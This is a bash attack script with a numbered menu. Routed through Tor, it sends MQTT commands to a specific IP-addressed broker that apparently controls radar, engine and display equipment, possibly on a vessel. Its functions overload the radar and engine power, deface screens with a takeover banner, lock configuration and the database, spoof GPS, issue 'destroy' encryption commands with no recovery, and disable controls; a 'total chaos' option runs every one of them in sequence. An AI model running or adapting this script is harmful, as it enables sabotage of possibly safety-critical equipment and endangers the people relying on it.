#!/bin/bash
# 🔥 RADAR CPE v1.45.1 MAX DAMAGE - FIXED LOOP
# MOSQUITTO 212.42.54.24:1883 - UUIDs VERIFICATI

IP="212.42.54.24"
PORT="1883"
RADAR_MW="68b58ad9-d0e3-4aaa-ab78-12b395781780"
RADAR_EXPORT="7f897323-7904-4ae7-9179-7b3a74bb5944"
DB_UUID="c655ffbd-d751-40a1-946a-7115fbffccad"
BACKEND1="6a843e52-5a0c-4148-a714-3e17bdfeaa80"
BACKEND2="8eb493ba-6d6d-4b7a-b8cb-0340dc84dfb4"

DEFACE_MSG='{"overlay":{"priority":9999,"permanent":true,"text":"СИСТЕМА ПОД УПРАВЛЕНИЕМ TRUSTEDF57 SUCATEMELO","style":{"size":96,"color":"FF0000","blink":true},"controls":"disabled"}}'

# ===============================
# FUNZIONI CORRETTE
# ===============================

max_power() {
    echo "⚡ [MAX POWER] Iniettando overload..."
    torsocks mosquitto_pub -h $IP -p $PORT -t "B/RRM/cmd" -m '{"action":"max_power","overload":true}' 2>/dev/null
    torsocks mosquitto_pub -h $IP -p $PORT -t "B/RADAR-MW/$RADAR_MW/cmd" -m '{"range":96,"gain":150,"power":2}' 2>/dev/null
    torsocks mosquitto_pub -h $IP -p $PORT -t "B/BACKEND/$BACKEND1/engine" -m '{"rpm":120,"propeller":120}' 2>/dev/null
    echo "✅ RRM/RADAR/ENGINE = 150% OVERLOAD!"
}

deface_all() {
    echo "🎨 [DEFACE] Schermi sotto controllo..."
    torsocks mosquitto_pub -h $IP -p $PORT -t "B/RADAR-MW/$RADAR_MW/display" -m "$DEFACE_MSG" 2>/dev/null
    torsocks mosquitto_pub -h $IP -p $PORT -t "B/RADAR-EXPORT-MW/$RADAR_EXPORT/display" -m "$DEFACE_MSG" 2>/dev/null
    torsocks mosquitto_pub -h $IP -p $PORT -t "B/MONITOR/display" -m "$DEFACE_MSG" 2>/dev/null
    echo "✅ 3+ DISPLAY DEFACE 96px ROSSO!"
}

lockdown() {
    echo "🔒 [LOCKDOWN] Sistema irreversibile..."
    torsocks mosquitto_pub -h $IP -p $PORT -t "B/CONFIG/lockdown" -m '{"permanent":true,"owner":"TRUSTEDF57"}' 2>/dev/null
    torsocks mosquitto_pub -h $IP -p $PORT -t "B/DB/$DB_UUID/lock" -m '{"read_only":true}' 2>/dev/null
    torsocks mosquitto_pub -h $IP -p $PORT -t "B/LBS/kill" -m '{"gps_spoof":{"lat":999,"lon":999}}' 2>/dev/null
    echo "✅ CONFIG/DB/LBS = BLOCCATI!"
}

aes_destroy() {
    echo "🔐 [AES-256] Cifratura distruttiva..."
    CRYPTO='{"destroy":{"algo":"AES-256-CBC","services":"ALL","no_recovery":true}}'
    torsocks mosquitto_pub -h $IP -p $PORT -t "B/CONFIG/crypto_destroy" -m "$CRYPTO" 2>/dev/null
    torsocks mosquitto_pub -h $IP -p $PORT -t "B/RADAR-MW/$RADAR_MW/crypto_destroy" -m "$CRYPTO" 2>/dev/null
    torsocks mosquitto_pub -h $IP -p $PORT -t "B/DB/$DB_UUID/crypto_destroy" -m "$CRYPTO" 2>/dev/null
    echo "✅ TUTTI I SERVIZI CIFRATI - NO KEY!"
}

display_lock() {
    echo "👁️ [DEFACE-ONLY] Monitor bloccati..."
    torsocks mosquitto_pub -h $IP -p $PORT -t "B/MONITOR/mode" -m '{"deface_only":true,"controls_dead":true}' 2>/dev/null
    echo "✅ MONITOR = SOLO DEFACE PERMANENTE!"
}

total_chaos() {
    echo "💥 [TOTAL CHAOS] Sequenza completa..."
    max_power
    sleep 1
    deface_all  
    sleep 1
    lockdown
    sleep 1
    aes_destroy
    sleep 1
    display_lock
    echo "🎯 CPE v1.45.1 COMPLETAMENTE DISTRUTTO!"
}

dump_status() {
    echo "📊 [STATUS CHECK] Verifica danni..."
    echo "Comando: torsocks mosquitto_sub -h $IP -p $PORT -t 'B/#' -v | grep -i 'crypto\|deface\|lock\|error'"
    torsocks mosquitto_sub -h $IP -p $PORT -t "B/#" -v -C 20 2>/dev/null | grep -iE "(crypto|deface|lock|error|fail|dead)"
}

# ===============================
# LOOP MENU FISSO - NON SI CHIUDE
# ===============================

while true; do
    clear
    echo "🔥==============================================="
    echo "    RADAR CPE v1.45.1 DAMAGE MENU - $IP:$PORT"
    echo "==============================================="
    echo "1) ⚡ MAX POWER OVERLOAD"
    echo "2) 🎨 FULL DEFACE ATTACK"  
    echo "3) 🔒 SYSTEM LOCKDOWN"
    echo "4) 🔐 AES-256 DESTROY"
    echo "5) 👁️ DEFACE-ONLY MODE"
    echo "6) 💥 TOTAL CHAOS (1-5)"
    echo "7) 📊 CHECK DAMAGE"
    echo "0) ❌ EXIT"
    echo "==============================================="
    
    read -p "SELEZIONA [0-7]: " choice
    
    case $choice in
        1) max_power; read -p $'\n[ENTER] per continuare...' ;;
        2) deface_all; read -p $'\n[ENTER] per continuare...' ;;
        3) lockdown; read -p $'\n[ENTER] per continuare...' ;;
        4) aes_destroy; read -p $'\n[ENTER] per continuare...' ;;
        5) display_lock; read -p $'\n[ENTER] per continuare...' ;;
        6) total_chaos; read -p $'\n[ENTER] per continuare...' ;;
        7) dump_status; read -p $'\n[ENTER] per continuare...' ;;
        0) echo "👋 Uscita..."; exit 0 ;;
        *) echo "❌ [ERRORE] Solo 0-7!"; sleep 1 ;;
    esac
done
